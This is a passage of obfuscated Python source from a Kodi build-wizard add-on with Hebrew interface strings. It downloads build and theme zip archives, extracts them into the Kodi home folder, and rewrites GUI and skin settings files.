			O0OOO0OOOOOOO0O0O =re .compile (OOO000O00O000O000 ).findall (OO000O0O00000OO00 )[0 ]#line:3885
			OOOOOO000O00O0O00 =open (O0OO0O0O0OOOO00O0 ,'w')#line:3886
			OOOOOO000O00O0O00 .write (OO000O0O00000OO00 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0OOO0OOOOOOO0O0O ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3887
			OOOOOO000O00O0O00 .close ()#line:3888
		except :#line:3889
				pass #line:3890
		wiz .kodi17Fix ()#line:3891
		O0OO0O0O0OOOO00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3892
		try :#line:3893
			OOOOOO000O00O0O00 =open (O0OO0O0O0OOOO00O0 ,'r')#line:3894
			OO000O0O00000OO00 =OOOOOO000O00O0O00 .read ()#line:3895
			OOOOOO000O00O0O00 .close ()#line:3896
			OOO000O00O000O000 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3897
			O0OOO0OOOOOOO0O0O =re .compile (OOO000O00O000O000 ).findall (OO000O0O00000OO00 )[0 ]#line:3898
			OOOOOO000O00O0O00 =open (O0OO0O0O0OOOO00O0 ,'w')#line:3899
			OOOOOO000O00O0O00 .write (OO000O0O00000OO00 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0OOO0OOOOOOO0O0O ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3900
			OOOOOO000O00O0O00 .close ()#line:3901
		except :#line:3902
				pass #line:3903
		swapSkins ('skin.Premium.mod')#line:3904
def buildWizard (OOO00O000OO0000OO ,O0OOO00OO00OO00OO ,theme =None ,over =False ):#line:3907
	if over ==False :#line:3908
		OO0OO0O00O0O00O00 =wiz .checkBuild (OOO00O000OO0000OO ,'url')#line:3909
		if OO0OO0O00O0O00O00 ==False :#line:3911
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3916
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3917
			return #line:3918
		OO0O0O00OOO0OO0O0 =wiz .workingURL (OO0OO0O00O0O00O00 )#line:3919
		if OO0O0O00OOO0OO0O0 ==False :#line:3920
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OO0O0O00OOO0OO0O0 ))#line:3921
			return #line:3922
	if O0OOO00OO00OO00OO =='gui':#line:3923
		if OOO00O000OO0000OO ==BUILDNAME :#line:3924
			if over ==True :O00000O0OOOOO00OO =1 #line:3925
			else :O00000O0OOOOO00OO =1 #line:3926
		else :#line:3927
			O00000O0OOOOO00OO =1 #line:3928
		if O00000O0OOOOO00OO :#line:3929
			remove_addons ()#line:3930
			remove_addons2 ()#line:3931
			OO000OOO0O00OO00O =wiz .checkBuild (OOO00O000OO0000OO ,'gui')#line:3932
			OO0OOO0O0O00O0OO0 =OOO00O000OO0000OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3933
			if not wiz .workingURL (OO000OOO0O00OO00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3934
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3935
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00O000OO0000OO ),'','אנא המתן')#line:3936
			OO000OOO0OOOOOOOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0OOO0O0O00O0OO0 )#line:3937
			try :os .remove (OO000OOO0OOOOOOOO )#line:3938
			except :pass #line:3939
			logging .warning (OO000OOO0O00OO00O )#line:3940
			if 'google'in OO000OOO0O00OO00O :#line:3941
			   O00OOOOO00O0OO00O =googledrive_download (OO000OOO0O00OO00O ,OO000OOO0OOOOOOOO ,DP ,wiz .checkBuild (OOO00O000OO0000OO ,'filesize'))#line:3942
			else :#line:3945
			  downloader .download (OO000OOO0O00OO00O ,OO000OOO0OOOOOOOO ,DP )#line:3946
			xbmc .sleep (100 )#line:3947
			OOOO00O000OO00000 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00O000OO0000OO )#line:3948
			DP .update (0 ,OOOO00O000OO00000 ,'','אנא המתן')#line:3949
			extract .all (OO000OOO0OOOOOOOO ,HOME ,DP ,title =OOOO00O000OO00000 )#line:3950
			DP .close ()#line:3951
			wiz .defaultSkin ()#line:3952
			wiz .lookandFeelData ('save')#line:3953
			wiz .kodi17Fix ()#line:3954
			if KODIV >=18 :#line:3955
				skindialogsettind18 ()#line:3956
			xbmc .executebuiltin ("ReloadSkin()")#line:3957
			if INSTALLMETHOD ==1 :OOOO0O0OO00O0O0O0 =1 #line:3958
			elif INSTALLMETHOD ==2 :OOOO0O0OO00O0O0O0 =0 #line:3959
			else :DP .close ()#line:3960
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3961
			update_Votes ()#line:3962
			indicatorfastupdate ()#line:3963
		else :#line:3965
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3966
	if O0OOO00OO00OO00OO =='gui2':#line:3967
		if OOO00O000OO0000OO ==BUILDNAME :#line:3968
			if over ==True :O00000O0OOOOO00OO =1 #line:3969
			else :O00000O0OOOOO00OO =1 #line:3970
		else :#line:3971
			O00000O0OOOOO00OO =1 #line:3972
		if O00000O0OOOOO00OO :#line:3973
			remove_addons ()#line:3974
			remove_addons2 ()#line:3975
			OO000OOO0O00OO00O =wiz .checkBuild (OOO00O000OO0000OO ,'gui')#line:3976
			OO0OOO0O0O00O0OO0 =OOO00O000OO0000OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3977
			if not wiz .workingURL (OO000OOO0O00OO00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3978
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3979
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00O000OO0000OO ),'','אנא המתן')#line:3980
			OO000OOO0OOOOOOOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0OOO0O0O00O0OO0 )#line:3981
			try :os .remove (OO000OOO0OOOOOOOO )#line:3982
			except :pass #line:3983
			logging .warning (OO000OOO0O00OO00O )#line:3984
			if 'google'in OO000OOO0O00OO00O :#line:3985
			   O00OOOOO00O0OO00O =googledrive_download (OO000OOO0O00OO00O ,OO000OOO0OOOOOOOO ,DP ,wiz .checkBuild (OOO00O000OO0000OO ,'filesize'))#line:3986
			else :#line:3989
			  downloader .download (OO000OOO0O00OO00O ,OO000OOO0OOOOOOOO ,DP )#line:3990
			xbmc .sleep (100 )#line:3991
			OOOO00O000OO00000 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00O000OO0000OO )#line:3992
			DP .update (0 ,OOOO00O000OO00000 ,'','אנא המתן')#line:3993
			extract .all (OO000OOO0OOOOOOOO ,HOME ,DP ,title =OOOO00O000OO00000 )#line:3994
			DP .close ()#line:3995
			wiz .defaultSkin ()#line:3996
			wiz .lookandFeelData ('save')#line:3997
			if INSTALLMETHOD ==1 :OOOO0O0OO00O0O0O0 =1 #line:4000
			elif INSTALLMETHOD ==2 :OOOO0O0OO00O0O0O0 =0 #line:4001
			else :DP .close ()#line:4002
		else :#line:4004
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4005
	elif O0OOO00OO00OO00OO =='fresh':#line:4006
		freshStart (OOO00O000OO0000OO )#line:4007
	elif O0OOO00OO00OO00OO =='normal':#line:4008
		if url =='normal':#line:4009
			if KEEPTRAKT =='true':#line:4010
				traktit .autoUpdate ('all')#line:4011
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4012
			if KEEPREAL =='true':#line:4013
				debridit .autoUpdate ('all')#line:4014
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4015
			if KEEPLOGIN =='true':#line:4016
				loginit .autoUpdate ('all')#line:4017
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4018
		OOO0O000O00O00O0O =int (KODIV );OO0OO0OOO00O0000O =int (float (wiz .checkBuild (OOO00O000OO0000OO ,'kodi')))#line:4019
		if not OOO0O000O00O00O0O ==OO0OO0OOO00O0000O :#line:4020
			if OOO0O000O00O00O0O ==16 and OO0OO0OOO00O0000O <=15 :O00OO00O000000OOO =False #line:4021
			else :O00OO00O000000OOO =True #line:4022
		else :O00OO00O000000OOO =False #line:4023
		if O00OO00O000000OOO ==True :#line:4024
			O0OO0O00O0O00OO00 =1 #line:4025
		else :#line:4026
			if not over ==False :O0OO0O00O0O00OO00 =1 #line:4027
			else :O0OO0O00O0O00OO00 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4028
		if O0OO0O00O0O00OO00 :#line:4029
			wiz .clearS ('build')#line:4030
			OO000OOO0O00OO00O =wiz .checkBuild (OOO00O000OO0000OO ,'url')#line:4031
			OO0OOO0O0O00O0OO0 =OOO00O000OO0000OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4032
			if not wiz .workingURL (OO000OOO0O00OO00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4033
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4034
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00O000OO0000OO ,wiz .checkBuild (OOO00O000OO0000OO ,'version')),'','אנא המתן')#line:4035
			OO000OOO0OOOOOOOO =os .path .join (PACKAGES ,'%s.zip'%OO0OOO0O0O00O0OO0 )#line:4036
			try :os .remove (OO000OOO0OOOOOOOO )#line:4037
			except :pass #line:4038
			logging .warning (OO000OOO0O00OO00O )#line:4039
			if 'google'in OO000OOO0O00OO00O :#line:4040
			   O00OOOOO00O0OO00O =googledrive_download (OO000OOO0O00OO00O ,OO000OOO0OOOOOOOO ,DP ,wiz .checkBuild (OOO00O000OO0000OO ,'filesize'))#line:4041
			else :#line:4044
			  downloader .download (OO000OOO0O00OO00O ,OO000OOO0OOOOOOOO ,DP )#line:4045
			xbmc .sleep (1000 )#line:4046
			OOOO00O000OO00000 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00O000OO0000OO ,wiz .checkBuild (OOO00O000OO0000OO ,'version'))#line:4047
			DP .update (0 ,OOOO00O000OO00000 ,'','אנא המתן...')#line:4048
			O0OO0O0OO00O0OOOO ,O00O0O0OOOOOO0OO0 ,O000OO00OOOO000O0 =extract .all (OO000OOO0OOOOOOOO ,HOME ,DP ,title =OOOO00O000OO00000 )#line:4049
			if int (float (O0OO0O0OO00O0OOOO ))>0 :#line:4050
				try :#line:4051
					wiz .fixmetas ()#line:4052
				except :pass #line:4053
				wiz .lookandFeelData ('save')#line:4054
				wiz .defaultSkin ()#line:4055
				wiz .setS ('buildname',OOO00O000OO0000OO )#line:4057
				wiz .setS ('buildversion',wiz .checkBuild (OOO00O000OO0000OO ,'version'))#line:4058
				wiz .setS ('buildtheme','')#line:4059
				wiz .setS ('latestversion',wiz .checkBuild (OOO00O000OO0000OO ,'version'))#line:4060
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4061
				wiz .setS ('installed','true')#line:4062
				wiz .setS ('extract',str (O0OO0O0OO00O0OOOO ))#line:4063
				wiz .setS ('errors',str (O00O0O0OOOOOO0OO0 ))#line:4064
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0OO0O0OO00O0OOOO ,O00O0O0OOOOOO0OO0 ))#line:4065
				fastupdatefirstbuild (NOTEID )#line:4066
				wiz .kodi17Fix ()#line:4067
				skin_homeselect ()#line:4068
				skin_lower ()#line:4069
				rdbuildinstall ()#line:4070
				try :gaiaserenaddon ()#line:4071
				except :pass #line:4072
				adults18 ()#line:4073
				skinfix18 ()#line:4074
				try :os .remove (OO000OOO0OOOOOOOO )#line:4076
				except :pass #line:4077
				OOO00OO00OO0O0O0O =(ADDON .getSetting ("auto_rd"))#line:4078
				if OOO00OO00OO0O0O0O =='true':#line:4079
					try :#line:4080
						setautorealdebrid ()#line:4081
					except :pass #line:4082
				try :#line:4083
					autotrakt ()#line:4084
				except :pass #line:4085
				OOOO00O000OO000OO =(ADDON .getSetting ("imdb_on"))#line:4086
				if OOOO00O000OO000OO =='true':#line:4087
					imdb_synck ()#line:4088
				iptvset ()#line:4089
				DP .close ()#line:4097
				OO0O0OOOOO0OOOOOO =wiz .themeCount (OOO00O000OO0000OO )#line:4098
				builde_Votes ()#line:4099
				indicator ()#line:4100
				if not OO0O0OOOOO0OOOOOO ==False :#line:4101
					buildWizard (OOO00O000OO0000OO ,'theme')#line:4102
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4103
				if INSTALLMETHOD ==1 :OOOO0O0OO00O0O0O0 =1 #line:4104
				elif INSTALLMETHOD ==2 :OOOO0O0OO00O0O0O0 =0 #line:4105
				else :resetkodi ()#line:4106
				if OOOO0O0OO00O0O0O0 ==1 :wiz .reloadFix ()#line:4108
				else :wiz .killxbmc (True )#line:4109
			else :#line:4110
				if isinstance (O00O0O0OOOOOO0OO0 ,unicode ):#line:4111
					O000OO00OOOO000O0 =O000OO00OOOO000O0 .encode ('utf-8')#line:4112
				OOO000OO00OO0OOO0 =open (OO000OOO0OOOOOOOO ,'r')#line:4113
				O0OOO00O00OOOOO00 =OOO000OO00OO0OOO0 .read ()#line:4114
				OO0OO0OO00O000OO0 =''#line:4115
				for OO0OOOOOOOO0OOO00 in O00OOOOO00O0OO00O :#line:4116
				  OO0OO0OO00O000OO0 ='key: '+OO0OO0OO00O000OO0 +'\n'+OO0OOOOOOOO0OOO00 #line:4117
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O000OO00OOOO000O0 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OO0OO0OO00O000OO0 )#line:4118
		else :#line:4119
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4120
	elif O0OOO00OO00OO00OO =='theme':#line:4121
		if theme ==None :#line:4122
			OO0O0OOOOO0OOOOOO =wiz .checkBuild (OOO00O000OO0000OO ,'theme')#line:4123
			O0OO0OOO00O00O00O =[]#line:4124
			if not OO0O0OOOOO0OOOOOO =='http://'and wiz .workingURL (OO0O0OOOOO0OOOOOO )==True :#line:4125
				O0OO0OOO00O00O00O =wiz .themeCount (OOO00O000OO0000OO ,False )#line:4126
				if len (O0OO0OOO00O00O00O )>0 :#line:4127
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OOO00O000OO0000OO ,COLOR1 ,len (O0OO0OOO00O00O00O )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4128
						wiz .log ("Theme List: %s "%str (O0OO0OOO00O00O00O ))#line:4129
						O0O00O00O00O0O0O0 =DIALOG .select (ADDONTITLE ,O0OO0OOO00O00O00O )#line:4130
						wiz .log ("Theme install selected: %s"%O0O00O00O00O0O0O0 )#line:4131
						if not O0O00O00O00O0O0O0 ==-1 :theme =O0OO0OOO00O00O00O [O0O00O00O00O0O0O0 ];O00OO00OO0O0OO0O0 =True #line:4132
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4133
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4134
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4135
		else :O00OO00OO0O0OO0O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OOO00O000OO0000OO ,wiz .checkBuild (OOO00O000OO0000OO ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4136
		if O00OO00OO0O0OO0O0 :#line:4137
			OOOO0O000O00OOO00 =wiz .checkTheme (OOO00O000OO0000OO ,theme ,'url')#line:4138
			OO0OOO0O0O00O0OO0 =OOO00O000OO0000OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4139
			if not wiz .workingURL (OOOO0O000O00OOO00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4140
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4141
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4142
			OO000OOO0OOOOOOOO =os .path .join (PACKAGES ,'%s.zip'%OO0OOO0O0O00O0OO0 )#line:4143
			try :os .remove (OO000OOO0OOOOOOOO )#line:4144
			except :pass #line:4145
			downloader .download (OOOO0O000O00OOO00 ,OO000OOO0OOOOOOOO ,DP )#line:4146
			xbmc .sleep (1000 )#line:4147
			DP .update (0 ,"","Installing %s "%OOO00O000OO0000OO )#line:4148
			OOOO0O0OO0O0000O0 =False #line:4149
			if url not in ["fresh","normal"]:#line:4150
				OOOO0O0OO0O0000O0 =testTheme (OO000OOO0OOOOOOOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4151
				OOO000OO00OOO00O0 =testGui (OO000OOO0OOOOOOOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4152
				if OOOO0O0OO0O0000O0 ==True :#line:4153
					wiz .lookandFeelData ('save')#line:4154
					OO00O00000000O0OO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4155
					OOO0000O00O0000O0 =xbmc .getSkinDir ()#line:4156
					skinSwitch .swapSkins (OO00O00000000O0OO )#line:4158
					O000O000OOOO0OOO0 =0 #line:4159
					xbmc .sleep (1000 )#line:4160
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O000OOOO0OOO0 <150 :#line:4161
						O000O000OOOO0OOO0 +=1 #line:4162
						xbmc .sleep (1000 )#line:4163
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4164
						wiz .ebi ('SendClick(11)')#line:4165
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4166
					xbmc .sleep (1000 )#line:4167
			OOOO00O000OO00000 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4168
			DP .update (0 ,OOOO00O000OO00000 ,'','אנא המתן')#line:4169
			O0OO0O0OO00O0OOOO ,O00O0O0OOOOOO0OO0 ,O000OO00OOOO000O0 =extract .all (OO000OOO0OOOOOOOO ,HOME ,DP ,title =OOOO00O000OO00000 )#line:4170
			wiz .setS ('buildtheme',theme )#line:4171
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0OO0O0OO00O0OOOO ,O00O0O0OOOOOO0OO0 ))#line:4172
			DP .close ()#line:4173
			if url not in ["fresh","normal"]:#line:4174
				wiz .forceUpdate ()#line:4175
				if KODIV >=17 :wiz .kodi17Fix ()#line:4176
				if OOO000OO00OOO00O0 ==True :#line:4177
					wiz .lookandFeelData ('save')#line:4178
					wiz .defaultSkin ()#line:4179
					OOO0000O00O0000O0 =wiz .getS ('defaultskin')#line:4180
					skinSwitch .swapSkins (OOO0000O00O0000O0 )#line:4181
					O000O000OOOO0OOO0 =0 #line:4182
					xbmc .sleep (1000 )#line:4183
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O000OOOO0OOO0 <150 :#line:4184
						O000O000OOOO0OOO0 +=1 #line:4185
						xbmc .sleep (1000 )#line:4186
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4188
						wiz .ebi ('SendClick(11)')#line:4189
					wiz .lookandFeelData ('restore')#line:4190
				elif OOOO0O0OO0O0000O0 ==True :#line:4191
					skinSwitch .swapSkins (OOO0000O00O0000O0 )#line:4192
					O000O000OOOO0OOO0 =0 #line:4193
					xbmc .sleep (1000 )#line:4194
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O000OOOO0OOO0 <150 :#line:4195
						O000O000OOOO0OOO0 +=1 #line:4196
						xbmc .sleep (1000 )#line:4197
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4199
						wiz .ebi ('SendClick(11)')#line:4200
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4201
					wiz .lookandFeelData ('restore')#line:4202
				else :#line:4203
					wiz .ebi ("ReloadSkin()")#line:4204
					xbmc .sleep (1000 )#line:4205
					wiz .ebi ("Container.Refresh")#line:4206
		else :#line:4207
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4208
def skin_homeselect ():#line:4212
	try :#line:4214
		O0O0OO00O0O0OO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4215
		O0O0OO0O0OO0OOOO0 =open (O0O0OO00O0O0OO00O ,'r')#line:4217
		OO000OO00OOOOO00O =O0O0OO0O0OO0OOOO0 .read ()#line:4218
		O0O0OO0O0OO0OOOO0 .close ()#line:4219
		OOOO0O0O00O00O0O0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:4220
		O000O0OOO0OOO000O =re .compile (OOOO0O0O00O00O0O0 ).findall (OO000OO00OOOOO00O )[0 ]#line:4221
		O0O0OO0O0OO0OOOO0 =open (O0O0OO00O0O0OO00O ,'w')#line:4222
		O0O0OO0O0OO0OOOO0 .write (OO000OO00OOOOO00O .replace ('<setting id="HomeS" type="string%s/setting>'%O000O0OOO0OOO000O ,'<setting id="HomeS" type="string"></setting>'))#line:4223
		O0O0OO0O0OO0OOOO0 .close ()#line:4224
	except :#line:4225
		pass #line:4226
def skin_lower ():#line:4229
	O0000000000O0O00O =(ADDON .getSetting ("lower"))#line:4230
	if O0000000000O0O00O =='true':#line:4231
		try :#line:4234
			O0O000OO0OOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4235
			OO0O0OO0000OOOO00 =open (O0O000OO0OOOOOO0O ,'r')#line:4237
			OO00O0O0O0000O000 =OO0O0OO0000OOOO00 .read ()#line:4238
			OO0O0OO0000OOOO00 .close ()#line:4239
			OOO0O000OO0O00000 ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4240
			OOOOOO0OO0OO0OO0O =re .compile (OOO0O000OO0O00000 ).findall (OO00O0O0O0000O000 )[0 ]#line:4241
			OO0O0OO0000OOOO00 =open (O0O000OO0OOOOOO0O ,'w')#line:4242
			OO0O0OO0000OOOO00 .write (OO00O0O0O0000O000 .replace ('<setting id="none_widget" type="bool%s/setting>'%OOOOOO0OO0OO0OO0O ,'<setting id="none_widget" type="bool">true</setting>'))#line:4243
			OO0O0OO0000OOOO00 .close ()#line:4244
			O0O000OO0OOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4246
			OO0O0OO0000OOOO00 =open (O0O000OO0OOOOOO0O ,'r')#line:4248
			OO00O0O0O0000O000 =OO0O0OO0000OOOO00 .read ()#line:4249
			OO0O0OO0000OOOO00 .close ()#line:4250
			OOO0O000OO0O00000 ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4251
			OOOOOO0OO0OO0OO0O =re .compile (OOO0O000OO0O00000 ).findall (OO00O0O0O0000O000 )[0 ]#line:4252
			OO0O0OO0000OOOO00 =open (O0O000OO0OOOOOO0O ,'w')#line:4253
			OO0O0OO0000OOOO00 .write (OO00O0O0O0000O000 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OOOOOO0OO0OO0OO0O ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4254
			OO0O0OO0000OOOO00 .close ()#line:4255
			O0O000OO0OOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4257
			OO0O0OO0000OOOO00 =open (O0O000OO0OOOOOO0O ,'r')#line:4259
			OO00O0O0O0000O000 =OO0O0OO0000OOOO00 .read ()#line:4260
			OO0O0OO0000OOOO00 .close ()#line:4261
			OOO0O000OO0O00000 ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4262
			OOOOOO0OO0OO0OO0O =re .compile (OOO0O000OO0O00000 ).findall (OO00O0O0O0000O000 )[0 ]#line:4263
			OO0O0OO0000OOOO00 =open (O0O000OO0OOOOOO0O ,'w')#line:4264
			OO0O0OO0000OOOO00 .write (OO00O0O0O0000O000 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OOOOOO0OO0OO0OO0O ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4265
			OO0O0OO0000OOOO00 .close ()#line:4266
			O0O000OO0OOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4270
			OO0O0OO0000OOOO00 =open (O0O000OO0OOOOOO0O ,'r')#line:4272
			OO00O0O0O0000O000 =OO0O0OO0000OOOO00 .read ()#line:4273
			OO0O0OO0000OOOO00 .close ()#line:4274
			OOO0O000OO0O00000 ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4275
			OOOOOO0OO0OO0OO0O =re .compile (OOO0O000OO0O00000 ).findall (OO00O0O0O0000O000 )[0 ]#line:4276
			OO0O0OO0000OOOO00 =open (O0O000OO0OOOOOO0O ,'w')#line:4277
			OO0O0OO0000OOOO00 .write (OO00O0O0O0000O000 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OOOOOO0OO0OO0OO0O ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4278
			OO0O0OO0000OOOO00 .close ()#line:4279
			O0O000OO0OOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4283
			OO0O0OO0000OOOO00 =open (O0O000OO0OOOOOO0O ,'r')#line:4285
			OO00O0O0O0000O000 =OO0O0OO0000OOOO00 .read ()#line:4286
			OO0O0OO0000OOOO00 .close ()#line:4287
			OOO0O000OO0O00000 ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4288
			OOOOOO0OO0OO0OO0O =re .compile (OOO0O000OO0O00000 ).findall (OO00O0O0O0000O000 )[0 ]#line:4289
			OO0O0OO0000OOOO00 =open (O0O000OO0OOOOOO0O ,'w')#line:4290
